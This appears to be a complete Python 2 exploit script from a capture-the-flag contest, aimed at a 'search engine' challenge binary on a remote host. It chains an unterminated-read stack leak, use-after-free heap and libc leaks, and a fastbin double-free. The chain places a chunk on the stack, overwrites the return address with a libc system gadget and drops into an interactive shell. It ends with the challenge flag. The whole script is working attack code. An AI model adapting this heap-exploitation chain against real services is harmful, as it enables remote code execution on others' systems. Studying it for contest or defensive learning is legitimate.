import sys
from socket import *
TARGET = ('search-engine-qgidg858.9447.plumbing', 9447)

s = socket()
s.connect(TARGET)

def rd(*suffixes):
    out = ''
    while 1:
        x = s.recv(1)
        if not x:
            raise EOFError()
        sys.stdout.write(x)
        sys.stdout.flush()
        out += x

        for suffix in suffixes:
            if out.endswith(suffix):
                break
        else:
            continue
        break
    return out

def pr(x):
    s.send(str(x))
    print "<%s" % x

def menu():
    rd('3: Quit')

import re
import struct

# stack ptr leak via lack of termination in read_buf when len=48
menu()
pr('a'*96)
rd('is not a valid number')
stackptr = re.findall('a{48}(......) is not', rd('is not a valid number\n'))
if not stackptr:
    raise Exception("sorry, couldn't leak stack ptr")
stackptr = struct.unpack('<Q', stackptr[0] + '\0\0')[0]
print "Leaked stack pointer:", hex(stackptr)
# stackptr points precisely at the first read_int buffer (it's the strtol argument)

# heap leak via use-after-free, fastbin
pr('2\n') # add sentence
pr('56\n')
pr('a'*50 + ' DREAM')

menu()
pr('2\n') # add sentence
pr('56\n')
pr('b'*50 + ' DREAM')

menu()
pr('1\n') # search
pr('5\n')
pr('DREAM')
pr('y\n') # delete
pr('y\n') # delete

menu()
pr('1\n') # search
pr('5\n')
pr('\0' * 5)
rd('Found 56: ')
heapptr = struct.unpack('<Q', rd('Delete')[:8])[0]
print "Leaked heap pointer:", hex(heapptr)
heapbase = heapptr & ~0xfff
pr('n\n')

# libc leak via use-after-free, smallbin
menu()
pr('2\n') # add sentence
pr('512\n')
pr(('b'*256 + ' FLOWER ').ljust(512, 'c'))

menu()
pr('1\n') # search
pr('6\n')
pr('FLOWER')
pr('y\n') # delete

menu()
pr('1\n') # search
pr('6\n')
pr('\0'*6)
rd('Found 512: ')
libcptr = struct.unpack('<Q', rd('Delete')[:8])[0]
print "Leaked libc pointer:", hex(libcptr)
libcbase = libcptr - 0x3be7b8
pr('n\n')

# allocate three fastbin (0x38) sentences
menu()
pr('2\n') # add sentence
pr('56\n')
pr('a'*51 + ' ROCK')

menu()
pr('2\n') # add sentence
pr('56\n')
pr('b'*51 + ' ROCK')

menu()
pr('2\n') # add sentence
pr('56\n')
pr('c'*51 + ' ROCK')

# free all of them, starting with "c"
menu()
pr('1\n') # search
pr('4\n')
pr('ROCK')
pr('y\n') # delete 'c'
pr('y\n') # delete 'b'
pr('y\n') # delete 'a'

# ok, now the free list is [head]->a->b->c->NULL
# double-free to create a loop
menu()
pr('1\n') # search
pr('4\n')
pr('\0' * 4)
pr('y\n') # delete 'b'
pr('n\n') # don't delete 'a'

# now the free list is [head]->b->a->b->...
# allocate to take advantage of this
menu()
pr('2\n') # add sentence
pr('56\n')
pr(struct.pack('<Q', stackptr + 0x52).ljust(48, '\0') + ' MIRACLE')

# [head]->a->b->x
menu()
pr('2\n') # add sentence
pr('56\n')
pr('d'*48 + ' MIRACLE')

# this last allocation overlaps the first one.
# [head]->b->x
menu()
pr('2\n') # add sentence
pr('56\n')
pr('e'*48 + ' MIRACLE')

# now this last allocation goes wherever we want
# we chose a *stack address* which is deliberately misaligned.
# this causes a 0x40xxxx address to be interpreted as a valid 0x40 metadata item.
menu()
pr('2\n') # add sentence
pr('56\n')
ret = 0x400896
system_magic = libcbase + 0x4652c
pr(('A'*6 + struct.pack('<QQQQ', ret, ret, ret, system_magic)).ljust(56, 'U'))

menu()
pr('3\n') # exit, triggering return to our overwritten buffer

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

# 9447{this_w4S_heAPs_0f_FUn}
